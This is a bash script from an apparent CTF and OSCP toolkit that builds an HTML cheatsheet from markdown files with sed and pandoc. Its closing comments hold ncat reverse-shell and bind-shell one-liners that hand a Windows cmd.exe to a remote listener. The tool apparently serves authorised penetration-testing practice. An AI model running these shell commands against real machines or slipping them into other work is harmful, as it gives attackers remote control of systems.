#!/bin/bash

#------------------------------------------------------------------------------------------------------------------------
# Revere shell code generator
# Author: ooty99
#------------------------------------------------------------------------------------------------------------------------
# This is a heavily modified version of "Revere shell code generator" by ooty99. Please check the original headers and 
# notes below. This version will generate commands usable during different testing operations for Windows and Linux
# environments, usable with security-vm-setup tool created by @ayomawdb.
#------------------------------------------------------------------------------------------------------------------------

#------------------------------------------------------------------------------------------------------------------------
# Revere shell code generator
# Author: ooty99
#------------------------------------------------------------------------------------------------------------------------
# This simple script is designed to save precious time during the OSCP. I wrote it because I got tired of constantly
# copy/pasting one-line reverse shell commands, then opening another terminal pane, using ifconfig, scrolling to tun0,
# then having to move the cursor around and replace <IP ADDR> and <PORT> in the pasted command. This hopefully cuts down
# on some of the extra steps and keeps focus on the exploit.
#
# Feel free to modify anything you would like! Good luck.
#------------------------------------------------------------------------------------------------------------------------

if [ $# -lt 3 ]
  then
    echo "Usage ./commands.sh [source_ip] [source_port] [target_ip]"
fi

# Settings colors to distinguish output
# If your terminal has a background color that makes it hard to see, just paste the commented color code into the two below.
NOCOLOR='\033[0m'
COPYME='\033[0;32m' # Prints green text
DIVIDER='\033[1;33m' #Prints yellow text
# Red: '\033[0;31m'
# Cyan: '\033[0;36m'
# White: '\033[1;37m'
# Black: '\033[0;30m'

urlencode () {
  python -c "import urllib; print urllib.quote('''${command//\'/\'}''')"
}

printcommand() {
  echo -e "${COPYME}"
  echo -e "$command"
  echo -e $(urlencode)
  echo -e "${NOCOLOR}"
}

echo ""
echo "Generating cheatsheet with:"
echo " - Working Directory : $pwd"
echo " - HTTP Port         : $http_port"
echo " - SMB Share Name    : $smb_share"
echo ""

# Create combined Markdown file
echo "" > ../commands.md; 
for i in *_*.md; do 
  cat $i | \
    # ${pwd//\//\/} is replacing all / characters in path with \/
    sed "s/\$pwd/${pwd//\//\/}/g" | \
    #sed "s/\$target/$target/g" | \
    #sed "s/\$source_ip/$source_ip/g" | \
    #sed "s/\$source_port/$source_port/g" | \
    sed "s/\$http_port/$http_port/g" | \
    sed "s/\$smb_share/$smb_share/g" >> ../commands.md; 
done

# Create HTML from the combined Markdown file
pandoc -f markdown -t html5 \
    -o ../commands.html \
    --template style/pandoc-toc-sidebar/toc-sidebar.html \
    -B style/pandoc-toc-sidebar/nav \
    --toc --toc-depth=2 \
    -H style/head.html \
    --css=style/custom.css \
    --css=style/dashboard.css \
    --metadata pagetitle="BriskSec - CTF Tools" \
    --standalone \
    --self-contained \
    ../commands.md

#Rev
#ncat -lnvp 4444 --allow [win ip] --ssl    # kali
#ncat -nv [kali ip] 4444 -e cmd.exe --ssl

#Bind
#ncat -lnvp 4444 -e cmd.exe --allow [kali ip] --ssl      # win
#ncat -nv [win ip] 4444 --ssl